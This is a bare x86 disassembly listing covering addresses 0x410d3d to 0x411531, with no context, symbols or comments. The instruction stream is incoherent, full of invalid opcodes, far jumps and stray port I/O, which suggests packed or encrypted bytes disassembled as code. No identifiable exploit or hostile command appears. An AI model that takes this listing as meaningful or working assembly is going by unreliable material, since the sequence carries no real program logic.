  410d3d:	mov    al,ds:0xb5a525fc
  410d42:	loopne 0x410d09
  410d44:	and    edi,DWORD PTR fs:[ebx-0x12]
  410d48:	nop
  410d49:	push   0x66a554fc
  410d4e:	call   0x10b22da3
  410d53:	mov    dl,al
  410d55:	stc    
  410d56:	ficom  DWORD PTR [ebx-0x4e]
  410d59:	add    BYTE PTR [ecx-0xec71acd],al
  410d5f:	retf   
  410d60:	leave  
  410d61:	add    ebx,esp
  410d63:	aaa    
  410d64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d65:	es jp  0x410cfa
  410d68:	test   DWORD PTR [edi-0x6f],0xcc78390b
  410d6f:	jb     0x410dec
  410d71:	jl     0x410de4
  410d73:	jne    0x410cfb
  410d75:	inc    eax
  410d76:	pop    ss
  410d77:	mov    esi,0xf934d9b4
  410d7c:	pop    ds
  410d7d:	mov    bl,0xa
  410d7f:	cs xor al,0xb6
  410d82:	mov    cl,0x91
  410d84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d85:	mov    esi,esp
  410d87:	fmul   QWORD PTR [esi+edx*4]
  410d8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d8b:	pop    ss
  410d8c:	lock xchg ebx,eax
  410d8e:	inc    ebx
  410d8f:	add    eax,DWORD PTR [ebx+0x361fee63]
  410d95:	xchg   esi,eax
  410d96:	jmp    0xad64c72d
  410d9b:	xor    eax,0xdd779cf8
  410da0:	or     eax,0x249d1c9a
  410da5:	fstp   TBYTE PTR [eax+0x44f001fc]
  410dab:	adc    al,0xb2
  410dad:	mov    ecx,0x5bbf9b4b
  410db2:	sbb    esi,DWORD PTR [edi-0x2e3d3cc3]
  410db8:	push   0x1c
  410dba:	adc    edx,DWORD PTR [edx]
  410dbc:	rcl    BYTE PTR [ebx],1
  410dbe:	retf   0x73d9
  410dc1:	aaa    
  410dc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410dc3:	jmp    0x3e42:0x20afe277
  410dca:	jmp    0x410e2b
  410dcc:	fsubr  DWORD PTR [ecx-0x40bffb]
  410dd2:	or     ch,ah
  410dd4:	push   ecx
  410dd5:	xchg   edi,eax
  410dd6:	nop
  410dd7:	cmp    edx,esi
  410dd9:	test   dl,bl
  410ddb:	xor    al,0xa0
  410ddd:	cmp    eax,0x4d427494
  410de2:	xor    bh,BYTE PTR ds:0x1d46205d
  410de8:	xchg   ecx,eax
  410de9:	add    BYTE PTR [ecx],ch
  410deb:	arpl   ax,di
  410ded:	xchg   ebx,eax
  410dee:	push   0xffffff87
  410df0:	mov    DWORD PTR [edx+0x2d883ecc],esi
  410df6:	jbe    0x410e41
  410df8:	cwde   
  410df9:	fmul   st,st(4)
  410dfb:	sahf   
  410dfc:	jmp    0xec89497f
  410e01:	std    
  410e02:	pop    ds
  410e03:	inc    esi
  410e04:	iret   
  410e05:	or     al,0xf9
  410e07:	mov    WORD PTR [ebx],?
  410e09:	dec    ebx
  410e0a:	sub    eax,0x1fea1007
  410e0f:	popf   
  410e10:	mov    WORD PTR [edx+0x1a],es
  410e13:	outs   dx,BYTE PTR ds:[esi]
  410e15:	pushf  
  410e16:	xchg   ecx,eax
  410e17:	clc    
  410e18:	les    ecx,FWORD PTR [esi+0x9]
  410e1b:	arpl   WORD PTR [esi+0x1e],di
  410e1e:	xchg   ecx,eax
  410e1f:	dec    esi
  410e20:	sbb    ebp,0x9cf0ee84
  410e26:	js     0x410e35
  410e28:	inc    ebp
  410e29:	test   BYTE PTR [eax-0x4b],0xc5
  410e2d:	std    
  410e2e:	lds    ebx,FWORD PTR [ebx-0x44]
  410e31:	outs   dx,DWORD PTR ds:[esi]
  410e32:	clc    
  410e33:	js     0x410ea5
  410e35:	test   BYTE PTR [edx-0xf],dh
  410e38:	out    0xaa,eax
  410e3a:	mov    ebx,0xd263d97f
  410e3f:	inc    ebp
  410e40:	outs   dx,BYTE PTR gs:[esi]
  410e42:	sar    DWORD PTR [edi+0x4d74c44a],1
  410e48:	dec    edi
  410e49:	inc    ebp
  410e4a:	adc    al,0xda
  410e4c:	ds dec eax
  410e4e:	rcr    DWORD PTR [edx-0x5e],0x6f
  410e52:	add    eax,0x96916ac1
  410e57:	jge    0x410de0
  410e59:	call   0x6382:0x1d16df42
  410e60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e62:	inc    ebp
  410e63:	xor    bh,BYTE PTR [edi]
  410e65:	ja     0x410e57
  410e67:	dec    edi
  410e68:	test   eax,0x14a7a7cb
  410e6d:	mov    dh,0x8c
  410e6f:	mov    eax,0xf1ddcd0b
  410e74:	call   0x3d25:0x62dccbfa
  410e7b:	pop    esi
  410e7c:	add    al,0x2
  410e7e:	in     al,dx
  410e7f:	cld    
  410e80:	inc    ebp
  410e81:	rcl    DWORD PTR [ebx-0x2f],1
  410e84:	jp     0x410ee7
  410e86:	jns    0x410ecc
  410e88:	mov    BYTE PTR [ebx+0x74fa04eb],dh
  410e8e:	sub    eax,edx
  410e90:	loop   0x410e35
  410e92:	pop    ss
  410e93:	jmp    0xd351:0x4f2e0eac
  410e9a:	scas   al,BYTE PTR es:[edi]
  410e9b:	add    eax,0xaa61f464
  410ea0:	mov    al,0xbf
  410ea2:	fwait
  410ea3:	jmp    0xd386:0xb953979e
  410eaa:	jmp    0x653c:0xbf47f277
  410eb1:	(bad)  
  410eb2:	pop    ebp
  410eb3:	(bad)  
  410eb4:	sub    BYTE PTR [eax+0x4df12540],bl
  410eba:	leave  
  410ebb:	inc    ecx
  410ebc:	leave  
  410ebd:	jns    0x410ebe
  410ebf:	sub    eax,0x3f017bb5
  410ec4:	jmp    0x840e:0x3daf2afe
  410ecb:	xchg   edi,eax
  410ecc:	mov    esp,0xfbaa8bea
  410ed1:	outs   dx,DWORD PTR ds:[esi]
  410ed2:	add    ecx,DWORD PTR [esi+0x3]
  410ed5:	push   esp
  410ed6:	mov    bl,0x68
  410ed8:	sar    BYTE PTR [ecx-0x5e],0xb2
  410edc:	pop    esi
  410edd:	call   0x2e66854a
  410ee2:	push   0xc0759609
  410ee7:	inc    esi
  410ee8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ee9:	pusha  
  410eea:	pop    ecx
  410eeb:	imul   ebx,DWORD PTR [ecx-0x6e08a940],0xb85178a9
  410ef5:	fiadd  WORD PTR [ebp+0x7b]
  410ef8:	push   ebx
  410ef9:	push   ds
  410efa:	(bad)  
  410efb:	push   cs
  410efc:	into   
  410efd:	mov    ebx,0x1d00c3
  410f02:	je     0x410e91
  410f04:	test   eax,0xbb60f8a6
  410f09:	retf   
  410f0a:	inc    ebp
  410f0b:	sub    BYTE PTR [edx],ah
  410f0d:	dec    esi
  410f0e:	sbb    DWORD PTR [esi+0x1b],0x1c96d132
  410f15:	mov    ecx,edi
  410f17:	and    al,0x5d
  410f19:	inc    edi
  410f1a:	fst    DWORD PTR [eax-0x40695200]
  410f20:	xchg   esi,eax
  410f21:	jb     0x410f3d
  410f23:	and    al,bl
  410f25:	mov    ds:0xc2a32e8c,al
  410f2a:	les    eax,FWORD PTR [edx]
  410f2c:	popa   
  410f2d:	and    al,0x24
  410f2f:	xchg   ecx,eax
  410f30:	inc    edx
  410f31:	fs adc bl,0x52
  410f35:	jmp    0x410eca
  410f37:	add    DWORD PTR [esi+ecx*4],edx
  410f3a:	ds push esp
  410f3c:	and    eax,0x19613731
  410f41:	aam    0x76
  410f43:	push   ds
  410f44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f45:	push   esi
  410f46:	and    ch,BYTE PTR [eax+0x29]
  410f49:	fbstp  TBYTE PTR [edx]
  410f4b:	adc    dh,bh
  410f4d:	stos   DWORD PTR es:[edi],eax
  410f4e:	out    dx,eax
  410f4f:	int    0xbe
  410f51:	xor    eax,0xab6dab98
  410f56:	mov    ebp,0xbf972343
  410f5b:	jmp    0x583899b2
  410f60:	stos   BYTE PTR es:[edi],al
  410f61:	jmp    0x50e0a279
  410f66:	xor    BYTE PTR [eax+ecx*4],bl
  410f69:	imul   dh
  410f6b:	addr16 gs sbb al,0x74
  410f6f:	ss and al,0x9e
  410f72:	outs   dx,DWORD PTR ds:[esi]
  410f73:	push   edx
  410f74:	fist   DWORD PTR [ebx+0x5]
  410f77:	pop    DWORD PTR [edx+0x6e]
  410f7a:	mov    ebx,0xd9fbec42
  410f7f:	push   eax
  410f80:	sub    ah,BYTE PTR [esi]
  410f82:	jmp    DWORD PTR [esi+eax*2-0x47cd8825]
  410f89:	into   
  410f8a:	sbb    edi,ebp
  410f8c:	jp     0x410faa
  410f8e:	or     bl,bh
  410f90:	jge    0x410fe3
  410f92:	and    DWORD PTR [edx-0x6c],edx
  410f95:	sub    DWORD PTR [edx],ecx
  410f97:	(bad)  
  410f98:	imul   edx,esi,0x52
  410f9b:	shr    DWORD PTR [ecx-0x6edc3dfc],cl
  410fa1:	nop
  410fa2:	out    0xf9,eax
  410fa4:	mov    eax,0xc8837291
  410fa9:	arpl   WORD PTR ds:0x2356e33e,sp
  410faf:	add    eax,0x536d6084
  410fb4:	push   ebx
  410fb5:	in     eax,0x18
  410fb7:	xor    edx,0xffffffb4
  410fba:	push   esp
  410fbb:	mov    dl,0x17
  410fbd:	int3   
  410fbe:	test   BYTE PTR ds:0x84af0f91,bh
  410fc4:	dec    eax
  410fc5:	sub    edx,DWORD PTR [ebx]
  410fc7:	pop    ds
  410fc8:	(bad)  
  410fc9:	pushf  
  410fca:	neg    BYTE PTR [eax-0x72]
  410fcd:	test   BYTE PTR [ebp-0x72e64345],cl
  410fd3:	xchg   DWORD PTR [edx+0x20],ebp
  410fd6:	pop    ecx
  410fd7:	clc    
  410fd8:	jno    0x410fcb
  410fda:	(bad)  
  410fdb:	in     eax,0x31
  410fdd:	nop
  410fde:	loop   0x410fa9
  410fe0:	adc    al,BYTE PTR [esi-0x51558ab1]
  410fe6:	jp     0x410fd8
  410fe8:	fadd   st,st(6)
  410fea:	fs mov edi,0x129d5aa0
  410ff0:	dec    ebp
  410ff1:	fsub   QWORD PTR [esi]
  410ff3:	mov    eax,DWORD PTR [ecx+0x44f14ea1]
  410ff9:	mov    ecx,0x4b82898f
  410ffe:	std    
  410fff:	sbb    al,0x94
  411001:	sahf   
  411002:	sub    eax,0x6539394e
  411007:	mov    al,0xe4
  411009:	xchg   esi,eax
  41100a:	jmp    0xb95ef163
  41100f:	test   al,0x71
  411011:	paddusw mm5,QWORD PTR [edx+0x47ac7579]
  411018:	pop    ebx
  411019:	mov    ecx,0xf6793f8f
  41101e:	dec    esi
  41101f:	int    0xd1
  411021:	inc    edx
  411022:	xchg   edx,eax
  411023:	(bad)  
  411024:	fld    TBYTE PTR [ecx+edx*8]
  411027:	iret   
  411028:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411029:	out    0x3c,eax
  41102b:	ror    ebx,1
  41102d:	mov    esp,0x49cddee0
  411032:	mov    ecx,0x5dcdfdb3
  411037:	lea    ecx,[esi+0x38]
  41103a:	mov    esi,0x18108253
  41103f:	pop    ebp
  411040:	adc    eax,0x6c75b1d1
  411045:	mov    BYTE PTR [edx-0x69768bad],0xd5
  41104c:	sub    DWORD PTR [edx+0x4e0603a7],0x543eecb3
  411056:	dec    edx
  411057:	(bad)  
  411058:	fsubr  st,st(5)
  41105a:	outs   dx,BYTE PTR ds:[esi]
  41105b:	bnd jb 0x411039
  41105e:	lea    edx,[eax+0x1ea3adb]
  411064:	mov    esp,0x6f4f816b
  411069:	test   edi,ebx
  41106b:	add    ecx,ecx
  41106d:	mov    ds:0xe41c9c12,eax
  411072:	cmp    ecx,DWORD PTR ds:0xe1616e39
  411078:	fidiv  WORD PTR [ecx]
  41107a:	out    0x7c,eax
  41107c:	cmp    al,0xe9
  41107e:	fs (bad) 
  411080:	cmp    DWORD PTR [ecx-0x55a92ea8],esp
  411086:	adc    BYTE PTR [ecx-0x654d56f3],ah
  41108c:	sub    al,dh
  41108e:	scas   eax,DWORD PTR es:[edi]
  41108f:	in     al,dx
  411090:	ret    
  411091:	jmp    0xbfbe:0xca71d79b
  411098:	sub    ecx,DWORD PTR es:[edi+0x7f4dbdf4]
  41109f:	pop    esp
  4110a0:	loope  0x4110f8
  4110a2:	push   esp
  4110a3:	mov    esp,0xa8320b0a
  4110a8:	mov    edi,DWORD PTR [edx+0x7a]
  4110ab:	cmp    bh,BYTE PTR [edi+0x58142217]
  4110b1:	(bad)  
  4110b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110b3:	and    al,0x63
  4110b5:	xlat   BYTE PTR ds:[ebx]
  4110b6:	arpl   si,dx
  4110b8:	ret    
  4110b9:	pop    ss
  4110ba:	int3   
  4110bb:	jbe    0x411129
  4110bd:	(bad)  
  4110be:	fidiv  WORD PTR [eax+0x5a279add]
  4110c4:	jp     0x41107c
  4110c6:	or     BYTE PTR ds:0xf4956836,ah
  4110cc:	in     eax,0x2f
  4110ce:	dec    eax
  4110cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110d0:	cwde   
  4110d1:	and    DWORD PTR [eax+0x1c],esi
  4110d4:	jg     0x411066
  4110d6:	mov    ah,0x3f
  4110d8:	repz xor dl,ah
  4110db:	pop    es
  4110dc:	fmul   QWORD PTR [ebp-0x13ecf143]
  4110e2:	out    0x5e,eax
  4110e4:	mov    eax,0x53ed8364
  4110e9:	mov    bl,0xb5
  4110eb:	stos   DWORD PTR es:[edi],eax
  4110ec:	inc    ebp
  4110ed:	jle    0x41114f
  4110ef:	or     al,0xed
  4110f1:	fidiv  WORD PTR [edi]
  4110f3:	call   0x991ad9d4
  4110f8:	call   0x4dcb28a4
  4110fd:	loope  0x41109c
  4110ff:	inc    ebp
  411100:	int    0x77
  411102:	push   es
  411103:	mov    ds:0xda5a651c,al
  411108:	and    ebx,DWORD PTR [eax]
  41110a:	std    
  41110b:	rol    bh,cl
  41110d:	push   esi
  41110e:	xchg   edx,eax
  41110f:	rcr    DWORD PTR [ebp-0x78],cl
  411112:	stc    
  411113:	or     DWORD PTR [edx-0x289b13f9],esi
  411119:	out    0x97,al
  41111b:	push   es
  41111c:	hlt    
  41111d:	mov    ecx,es
  41111f:	cli    
  411120:	popa   
  411121:	push   edx
  411122:	mov    bh,0xc9
  411124:	dec    eax
  411125:	pushf  
  411126:	out    dx,eax
  411127:	loope  0x411124
  411129:	xchg   BYTE PTR [edi-0x36],bh
  41112c:	or     al,0x1f
  41112e:	mov    edx,0xd7291732
  411133:	aad    0x43
  411135:	xor    BYTE PTR [edx+0x3e],al
  411138:	sub    ecx,ebp
  41113a:	ret    
  41113b:	jg     0x4110ec
  41113d:	into   
  41113e:	cmp    bl,bh
  411140:	add    DWORD PTR [esi+0x1cb683c5],eax
  411146:	xchg   ebx,eax
  411147:	inc    esp
  411148:	pop    ebp
  411149:	jle    0x4110dc
  41114b:	out    0xad,al
  41114d:	xor    ebp,DWORD PTR [ebp-0x67]
  411150:	in     al,0xa0
  411152:	mov    bl,0x8
  411154:	(bad)  
  411155:	mov    cl,0x95
  411157:	xchg   edx,eax
  411158:	add    edi,DWORD PTR [ebp+ebp*4+0x30]
  41115c:	ret    
  41115d:	jns    0x411153
  41115f:	pop    ebp
  411160:	xchg   esi,eax
  411161:	test   eax,0x269b61f9
  411166:	sbb    DWORD PTR [edi-0x38],edx
  411169:	sahf   
  41116a:	push   esp
  41116b:	ret    0xf17c
  41116e:	mov    al,0x71
  411170:	fwait
  411171:	daa    
  411172:	out    0x1e,al
  411174:	jl     0x41119e
  411176:	rol    BYTE PTR [ebx],cl
  411178:	or     DWORD PTR [edi],ebp
  41117a:	icebp  
  41117b:	and    DWORD PTR [ebp*1-0x5d435384],ebp
  411182:	dec    esp
  411183:	dec    esi
  411184:	shl    BYTE PTR [ebx+ebx*4],1
  411187:	lea    ebp,[esi]
  411189:	mov    WORD PTR [esi-0x3831d99e],es
  41118f:	push   edi
  411190:	push   esi
  411191:	imul   ebp,ecx,0xc4fcb6ff
  411197:	jle    0x41111e
  411199:	or     edx,DWORD PTR [edi+0x10]
  41119c:	jecxz  0x41121a
  41119e:	or     al,0xba
  4111a0:	sbb    DWORD PTR [edi+eax*2],ebp
  4111a3:	gs in  al,0xe7
  4111a6:	sahf   
  4111a7:	aam    0xc
  4111a9:	jle    0x4111b9
  4111ab:	clc    
  4111ac:	sub    BYTE PTR [edi+0x1ce1786c],0x60
  4111b3:	bound  ebx,QWORD PTR [edx]
  4111b5:	test   eax,0x8bc81ef6
  4111ba:	push   0x32
  4111bc:	out    dx,eax
  4111bd:	mov    edx,0x8acae6c0
  4111c2:	and    DWORD PTR [esi+edx*4-0x3bd20336],eax
  4111c9:	xchg   ebp,eax
  4111ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111cb:	maxps  xmm0,xmm3
  4111ce:	jno    0x4111b0
  4111d0:	sub    al,0x8c
  4111d2:	dec    eax
  4111d3:	xchg   esi,eax
  4111d4:	sub    DWORD PTR gs:[eax+0x3eda607d],edi
  4111db:	cmp    al,0x4c
  4111dd:	or     dh,bl
  4111df:	fwait
  4111e0:	xchg   ecx,eax
  4111e1:	push   ss
  4111e2:	gs mov edi,0x84866b37
  4111e8:	pushf  
  4111e9:	mov    al,ds:0x36ec052b
  4111ee:	cmp    al,0xd
  4111f0:	add    BYTE PTR [ebp-0x3f],0x3d
  4111f4:	retf   
  4111f5:	mov    esi,0x3858a2f7
  4111fa:	je     0x4111c3
  4111fc:	ret    0xccc5
  4111ff:	test   eax,0x58b2a96e
  411204:	in     eax,0xea
  411206:	pusha  
  411207:	cmc    
  411208:	jl     0x411289
  41120a:	je     0x41126f
  41120c:	ret    0x5db7
  41120f:	fs leave 
  411211:	inc    ebp
  411212:	cmp    ebp,DWORD PTR [ecx+0x1c153e01]
  411218:	test   DWORD PTR [ecx],esi
  41121a:	push   esi
  41121b:	sbb    BYTE PTR [ecx],bh
  41121d:	les    esi,FWORD PTR [edx+0x4c7d0601]
  411223:	adc    dl,al
  411225:	mov    bh,0xb2
  411227:	ret    
  411228:	push   esp
  411229:	xchg   ebp,eax
  41122a:	add    al,BYTE PTR [ecx-0x3a]
  41122d:	rcl    BYTE PTR [esi*8+0x28fb6063],1
  411234:	cmp    eax,0xfae4a005
  411239:	js     0x4111f5
  41123b:	jbe    0x41125d
  41123d:	push   ebp
  41123e:	lods   eax,DWORD PTR ds:[esi]
  41123f:	xchg   ebp,eax
  411240:	or     DWORD PTR [eax-0x3963c404],esp
  411246:	jle    0x411282
  411248:	pop    es
  411249:	je     0x411288
  41124b:	mov    edi,0x87992b06
  411250:	adc    edx,esi
  411252:	and    eax,0xcff353ee
  411257:	push   es
  411258:	mov    ebp,0x2378184
  41125d:	push   edi
  41125e:	clc    
  41125f:	jnp    0x411221
  411261:	(bad)  
  411262:	mov    ds:0xd054566b,eax
  411267:	call   0xb58d:0x3ce2b368
  41126e:	xchg   ecx,esp
  411270:	jns    0x4112e8
  411272:	gs and ch,dl
  411275:	les    ecx,FWORD PTR [ebp-0x3dc569b9]
  41127b:	xchg   ebp,eax
  41127c:	sub    ch,bh
  41127e:	pusha  
  41127f:	xor    edx,DWORD PTR [eax-0x31]
  411282:	pop    edx
  411283:	bound  edx,QWORD PTR [eax+0xb]
  411286:	cmp    eax,0xde6f316a
  41128b:	jmp    0x411290
  41128d:	pop    ecx
  41128e:	mov    WORD PTR [esi+0x394c60e9],?
  411294:	popa   
  411295:	add    al,0x6e
  411297:	daa    
  411298:	inc    esi
  411299:	mov    ah,0x6c
  41129b:	add    BYTE PTR [edx+0x4ef8f39b],dl
  4112a1:	dec    ebx
  4112a2:	cmc    
  4112a3:	idiv   cl
  4112a5:	div    BYTE PTR [esp+ecx*2-0x3d]
  4112a9:	dec    esp
  4112aa:	cld    
  4112ab:	jmp    0xde5d:0x8bd11389
  4112b2:	popa   
  4112b3:	popa   
  4112b4:	std    
  4112b5:	es cmp ch,dl
  4112b8:	pop    es
  4112b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112ba:	adc    ebp,DWORD PTR [edx-0x20069b38]
  4112c0:	push   esi
  4112c1:	gs mov ebp,0x13fdb650
  4112c7:	sub    eax,0xeb069cf2
  4112cc:	mov    ebx,gs
  4112ce:	cdq    
  4112cf:	pop    ss
  4112d0:	dec    edx
  4112d1:	loopne 0x41131a
  4112d3:	jecxz  0x4112a1
  4112d5:	lock data16 rcl BYTE PTR es:[ebx-0x54],1
  4112db:	or     esp,0xd43e1f4
  4112e1:	mov    al,0xc3
  4112e3:	push   ss
  4112e4:	pop    ebp
  4112e5:	call   0x81f932b8
  4112ea:	jge    0x411307
  4112ec:	mov    ebp,0x501cee47
  4112f1:	lods   al,BYTE PTR ds:[esi]
  4112f2:	scas   eax,DWORD PTR es:[edi]
  4112f3:	int3   
  4112f4:	sbb    al,0x79
  4112f6:	das    
  4112f7:	es push ds
  4112f9:	ja     0x4112d6
  4112fb:	iret   
  4112fc:	mov    ah,0x54
  4112fe:	mov    cl,0x54
  411300:	ret    
  411301:	data16 mov al,ds:0x5867dc18
  411307:	dec    ebx
  411308:	(bad)  
  411309:	mov    bh,0x4a
  41130b:	in     al,0xb1
  41130d:	popf   
  41130e:	and    cl,BYTE PTR [ebx-0x49258a2a]
  411314:	jno    0x411334
  411316:	out    0x7,eax
  411318:	and    DWORD PTR [ebp-0x2e],ecx
  41131b:	pop    ebp
  41131c:	xchg   ecx,eax
  41131d:	inc    ebp
  41131e:	cld    
  41131f:	dec    ebx
  411320:	ret    0x80a6
  411323:	cdq    
  411324:	jl     0x41131d
  411326:	mov    ch,0x2a
  411328:	pop    edi
  411329:	pop    esp
  41132a:	cmp    eax,0x9559b97c
  41132f:	aam    0x59
  411331:	dec    edx
  411332:	(bad)  
  411333:	jmp    0x6d8a:0x33492164
  41133a:	imul   ebp,DWORD PTR [eax+0x636148ac],0xffffffbc
  411341:	sbb    al,0xd2
  411343:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411344:	lods   eax,DWORD PTR ds:[esi]
  411345:	aaa    
  411346:	mov    bl,0xc5
  411348:	(bad)  
  411349:	jae    0x41134a
  41134b:	or     al,0x25
  41134d:	sbb    BYTE PTR [ecx+0x3978832d],dh
  411353:	rcr    ah,cl
  411355:	stos   BYTE PTR es:[edi],al
  411356:	add    al,bh
  411358:	jo     0x4113ab
  41135a:	push   ss
  41135b:	ficom  WORD PTR [ecx]
  41135d:	mov    ds:0x879cf1f,eax
  411362:	mov    esp,0x7c21db7
  411367:	pop    ebp
  411368:	fs inc eax
  41136a:	leave  
  41136b:	or     ch,BYTE PTR [esi]
  41136d:	sbb    dh,ch
  41136f:	lahf   
  411370:	lods   al,BYTE PTR ds:[esi]
  411371:	out    0xec,eax
  411373:	lock jl 0x4113a1
  411376:	sub    DWORD PTR [ebx-0xfc94547],0x73642196
  411380:	cli    
  411381:	mov    ch,0xbc
  411383:	sbb    ecx,DWORD PTR [eax]
  411385:	adc    BYTE PTR [esi],bh
  411387:	push   eax
  411388:	jmp    0x1a23:0x2b65efdd
  41138f:	dec    esp
  411390:	test   eax,0x9a4e8480
  411395:	je     0x411351
  411397:	mov    ebp,0xa190b7e
  41139c:	or     ecx,eax
  41139e:	push   esp
  41139f:	push   edx
  4113a0:	mov    eax,ds:0x553a2f36
  4113a5:	xchg   esi,eax
  4113a6:	pop    edx
  4113a7:	out    0x3f,al
  4113a9:	jge    0x4113d9
  4113ab:	xlat   BYTE PTR fs:[ebx]
  4113ad:	push   ds
  4113ae:	jnp    0x4113f4
  4113b0:	out    0xa3,al
  4113b2:	shr    DWORD PTR [esi-0x5c8a9613],0xa2
  4113b9:	enter  0x65da,0x25
  4113bd:	add    ebx,DWORD PTR ds:0x94144eab
  4113c3:	hlt    
  4113c4:	stos   BYTE PTR es:[edi],al
  4113c5:	sub    eax,0x6c9ec8b7
  4113ca:	dec    edi
  4113cb:	dec    eax
  4113cc:	jo     0x41142b
  4113ce:	push   es
  4113cf:	xchg   ecx,eax
  4113d0:	mov    ds:0xd4965f9c,al
  4113d5:	aam    0xbb
  4113d7:	xchg   ebx,eax
  4113d8:	cwde   
  4113d9:	aaa    
  4113da:	div    DWORD PTR [esi+0x12]
  4113dd:	loop   0x4113fb
  4113df:	mov    eax,0xcb1f3578
  4113e4:	mov    esi,0x898d8a37
  4113e9:	pop    edx
  4113eb:	mov    dh,0xfa
  4113ed:	stos   BYTE PTR es:[edi],al
  4113ee:	ret    0x27ba
  4113f1:	adc    BYTE PTR [edi+0x15c339c8],ch
  4113f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113f8:	in     al,dx
  4113f9:	cli    
  4113fa:	mov    ?,WORD PTR [ebx+0x350a8241]
  411400:	sbb    cl,BYTE PTR [ecx]
  411402:	sysenter 
  411404:	(bad)  
  411406:	cld    
  411407:	add    ah,ch
  411409:	call   0x71edd2ce
  41140e:	dec    esp
  41140f:	cld    
  411410:	iret   
  411411:	pusha  
  411412:	call   0x3eec:0xece1998b
  411419:	sbb    eax,0x4f3283c3
  41141e:	or     DWORD PTR [ecx+0x2fa30f86],esi
  411424:	jne    0x4113b6
  411426:	inc    edx
  411427:	dec    edi
  411428:	pop    ds
  411429:	scas   al,BYTE PTR es:[edi]
  41142a:	fwait
  41142b:	ror    BYTE PTR [esi-0x5f],1
  41142e:	in     al,dx
  41142f:	sbb    dh,dl
  411431:	mov    esp,0x2e86d843
  411436:	sar    BYTE PTR [ecx+0x54],1
  411439:	mov    DWORD PTR [esi],ecx
  41143b:	in     al,dx
  41143c:	cmp    DWORD PTR [ebx+0x6ee63290],esp
  411442:	push   ecx
  411443:	jmp    DWORD PTR [esi+0x2b]
  411446:	and    al,0x2f
  411448:	jae    0x411417
  41144a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41144b:	in     eax,dx
  41144c:	pop    esp
  41144d:	imul   edi,DWORD PTR [edi-0x6],0x10
  411451:	xor    ecx,DWORD PTR [edx-0x51]
  411454:	xchg   ebx,eax
  411455:	jne    0x41144a
  411457:	jb     0x4114ce
  411459:	stos   BYTE PTR es:[edi],al
  41145a:	mov    al,0x4c
  41145c:	pop    edx
  41145d:	sahf   
  41145e:	jbe    0x411432
  411460:	cmp    BYTE PTR [eax+ecx*1+0x219b0f55],bh
  411467:	adc    BYTE PTR ds:0xfbe45b27,ch
  41146d:	push   es
  41146e:	push   edx
  41146f:	or     ecx,DWORD PTR [ebx+0x5a]
  411472:	imul   esp,DWORD PTR [ecx+eiz*2-0x5e],0x47c9ade0
  41147a:	nop
  41147b:	popf   
  41147c:	repnz in al,dx
  41147e:	sti    
  41147f:	and    al,0xf1
  411481:	add    ebp,ebx
  411483:	xor    BYTE PTR [esi],bh
  411485:	js     0x41142b
  411487:	in     eax,dx
  411488:	daa    
  411489:	inc    ebx
  41148a:	xchg   esp,eax
  41148b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41148c:	mov    ch,0x48
  41148e:	sub    BYTE PTR [eax+ebx*1+0x12],al
  411492:	xor    edx,DWORD PTR [ebx]
  411494:	or     BYTE PTR [esi],cl
  411496:	inc    ecx
  411497:	jbe    0x4114a5
  411499:	pop    ebp
  41149a:	das    
  41149b:	push   ss
  41149c:	dec    esp
  41149d:	cli    
  41149e:	loope  0x411451
  4114a0:	mov    BYTE PTR [esi],bl
  4114a2:	inc    ecx
  4114a3:	(bad)  
  4114a4:	dec    esi
  4114a5:	test   BYTE PTR [esi-0x7a],al
  4114a8:	jo     0x41143e
  4114aa:	scas   eax,DWORD PTR es:[edi]
  4114ab:	sub    esp,0x61693546
  4114b1:	es mov cl,0xe7
  4114b4:	mov    ds:0x4c9c789c,eax
  4114b9:	fwait
  4114ba:	dec    ecx
  4114bb:	into   
  4114bc:	iret   
  4114bd:	test   BYTE PTR [ebx+edx*2+0x20],dl
  4114c1:	add    DWORD PTR [edx],esp
  4114c3:	ja     0x41148a
  4114c5:	iret   
  4114c6:	inc    ecx
  4114c7:	mov    ebp,?
  4114c9:	add    ebp,edx
  4114cb:	lahf   
  4114cc:	mov    ah,0xe8
  4114ce:	imul   esi,DWORD PTR [edi+0x2e9d75cd],0xcaa6de74
  4114d8:	lods   eax,DWORD PTR ds:[esi]
  4114d9:	xchg   ebx,eax
  4114da:	call   0x7d075e60
  4114df:	adc    ebx,DWORD PTR [ebx+ecx*4]
  4114e2:	or     BYTE PTR [eax],dl
  4114e4:	add    DWORD PTR [ecx-0x4ef29f33],edi
  4114ea:	pop    esp
  4114eb:	jnp    0x411492
  4114ed:	fiadd  DWORD PTR [esi]
  4114ef:	and    esi,DWORD PTR [ebx-0x43]
  4114f2:	stc    
  4114f3:	not    BYTE PTR [eax-0x2a4c17b5]
  4114f9:	mov    ch,0xed
  4114fb:	inc    edi
  4114fc:	xchg   BYTE PTR [ebp+0x282dd010],cl
  411502:	push   edx
  411503:	mov    esp,0xa95bb067
  411508:	jne    0x41151e
  41150a:	dec    edi
  41150b:	mov    eax,ds:0x39542917
  411510:	push   ebx
  411511:	int3   
  411512:	outs   dx,DWORD PTR ds:[esi]
  411513:	inc    ebx
  411514:	mov    bh,BYTE PTR [ebx+0x2acc640f]
  41151a:	daa    
  41151b:	dec    ebp
  41151c:	cmp    ebx,ecx
  41151e:	xor    al,0x4d
  411520:	adc    eax,0xfacd59ae
  411525:	push   esp
  411526:	rcl    BYTE PTR [ecx],0xec
  411529:	(bad)  
  41152a:	mov    edi,edi
  41152c:	xchg   edx,eax
  41152d:	mov    ch,0x30
  41152f:	or     bh,cl
  411531:	adc    al,0xfb
